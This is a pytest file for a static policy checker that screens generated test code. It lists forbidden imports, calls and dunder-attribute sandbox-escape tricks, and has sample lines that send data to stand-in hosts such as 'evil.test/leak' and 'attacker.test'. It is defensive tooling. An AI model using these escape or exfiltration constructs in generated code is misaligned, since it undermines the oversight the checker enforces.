"""Static policy for generated test code (AST). A check, not a sandbox."""

import pytest

from tools.code_policy import check_source

SUT = "http://127.0.0.1:61234"

GOOD = '''
import re
import uuid

import httpx
import pytest
from playwright.sync_api import expect


def test_ok(as_user, new_project, base_url, page):
    r = as_user("alice").post(f"/api/projects/{new_project()}/tasks", json={"title": str(uuid.uuid4())})
    assert r.status_code == 201, r.text
    page.goto(f"{base_url}/?user=alice")
    expect(page.locator("body")).to_have_attribute("data-ready", "true")
    assert re.match(r"\\d+", "1")
'''


def test_allowed_code_passes():
    assert check_source(GOOD, sut_url=SUT) == []


@pytest.mark.parametrize(
    "source, kind",
    [
        ("import os", "FORBIDDEN_IMPORT"),
        ("import shutil", "FORBIDDEN_IMPORT"),
        ("from subprocess import run", "FORBIDDEN_IMPORT"),
        ("from pathlib import Path", "FORBIDDEN_IMPORT"),
        ("import os.path as p", "FORBIDDEN_IMPORT"),
        ("from . import conftest", "FORBIDDEN_IMPORT"),
        ("x = open('meta.json').read()", "FORBIDDEN_NAME"),
        ("exec('1')", "FORBIDDEN_NAME"),
        ("eval('1')", "FORBIDDEN_NAME"),
        ("compile('1', 'f', 'exec')", "FORBIDDEN_NAME"),
        ("m = __import__('os')", "FORBIDDEN_NAME"),
        ("f = getattr(httpx, 'get')", "FORBIDDEN_NAME"),
        ("b = __builtins__", "FORBIDDEN_NAME"),
        ("d = pytest.__dict__", "FORBIDDEN_ATTRIBUTE"),
        ("c = ().__class__", "FORBIDDEN_ATTRIBUTE"),
        ("s = object.__subclasses__()", "FORBIDDEN_ATTRIBUTE"),
        ("b = pytest.__builtins__", "FORBIDDEN_ATTRIBUTE"),
        ("r = httpx.get('https://evil.test/leak')", "HARDCODED_URL"),
        ("r = httpx.get('http://127.0.0.1:9999/api')", "HARDCODED_URL"),
        ("u = f'ws://attacker.test/{1}'", "HARDCODED_URL"),
    ],
)
def test_forbidden_constructs(source, kind):
    violations = check_source("import httpx\nimport pytest\n" + source, sut_url=SUT)
    assert kind in {v.kind for v in violations}


def test_sut_base_url_literal_is_allowed():
    assert check_source(f"import httpx\nr = httpx.get('{SUT}/health')\n", sut_url=SUT) == []


def test_violations_carry_line_numbers():
    (v,) = check_source("import pytest\n\n\nimport os\n", sut_url=SUT)
    assert (v.kind, v.detail, v.line) == ("FORBIDDEN_IMPORT", "import os", 4)


def test_unparseable_code_is_left_to_pytest():
    """A syntax error is a collection error (rule R9), not a policy violation."""
    assert check_source("def test_a(:\n    pass\n", sut_url=SUT) == []
